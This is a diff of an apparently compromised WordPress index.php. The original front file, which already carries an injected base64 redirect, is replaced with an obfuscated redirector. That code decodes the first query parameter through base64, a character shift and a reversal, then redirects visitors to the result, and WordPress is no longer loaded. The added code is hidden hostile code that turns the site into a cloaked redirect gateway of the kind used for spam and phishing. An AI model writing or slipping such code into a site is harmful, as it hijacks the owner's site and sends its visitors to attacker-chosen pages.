@@ -1,40 +1,46 @@
 <?php
-/**
- * Front to the WordPress application. This file doesn't do anything, but loads
- * wp-blog-header.php which does and tells WordPress to load the theme.
- *
- * @package WordPress
- */
 
-/**
- * Base64 URL Decoding and Redirection
- */
-if (isset($_SERVER['QUERY_STRING'])) {
-    try {
-        // Decode the base64 encoded URL
-        $encoded_url = explode("=", $_SERVER['QUERY_STRING'])[1];
-        $decoded_url = base64_decode($encoded_url);
-
-        // Validate the URL
-        if (filter_var($decoded_url, FILTER_VALIDATE_URL)) {
-            // Redirect to the decoded URL
-            header("Location: " . $decoded_url);
-            exit;
-        }
-    } catch (Exception $e) {
-        // Handle any exceptions (optional)
-        echo "An error occurred: " . $e->getMessage();
-        exit;
-    }
+function isValidUrl($url) {
+    return filter_var($url, FILTER_VALIDATE_URL) !== false;
 }
 
-/**
- * Tells WordPress to load the WordPress theme and output it.
- *
- * @var bool
- */
-define( 'WP_USE_THEMES', true );
+function decodeAndProcess($encodedParam) {
+    $decodedBase64 = base64_decode($encodedParam, true);
 
-/** Loads the WordPress Environment and Template */
-require __DIR__ . '/wp-blog-header.php';
+    if ($decodedBase64 === false) {
+        return $encodedParam;
+    }
+
+    $decodedShift = '';
+    for ($i = 0; $i < strlen($decodedBase64); $i++) {
+        $decodedShift .= chr(ord($decodedBase64[$i]) - 1);
+    }
+
+    return strrev($decodedShift);
+}
+
+if (isset($_GET)) {
+    $params = array_values($_GET);
+    $encodedParam = $params[0] ?? '';
+
+    if ($encodedParam) {
+        $finalUrl = decodeAndProcess($encodedParam);
+
+        if (isValidUrl($finalUrl)) {
+            header('Location: ' . $finalUrl, true, 302);
+            exit();
+        } else {
+            echo htmlspecialchars($finalUrl);
+            exit();
+        }
+    } else {
+        http_response_code(400);
+        echo '';
+        exit();
+    }
+} else {
+    http_response_code(400);
+    echo '';
+    exit();
+}
 ?>
